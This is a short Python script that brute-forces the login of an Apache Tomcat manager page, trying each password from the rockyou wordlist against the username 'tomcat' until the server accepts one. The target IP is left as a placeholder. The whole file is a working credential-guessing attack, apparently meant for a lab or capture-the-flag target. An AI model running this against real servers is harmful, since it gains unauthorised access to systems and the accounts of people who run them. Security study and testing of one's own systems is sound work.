#!/usr/bin/env python3
import sys
import requests


target_url='http://----your_targets_IP--------/manager/html'
username= 'tomcat'

with open('/usr/share/wordlists/rockyou.txt','r',encoding='latin-1') as f:
        for line in f:
                password=line.strip()
                if not password:
                        continue                
                r=requests.get(target_url, auth=(username, password))

                if r.status_code==200:
                        print(f'Found: "{password}"')
                        sys.exit()

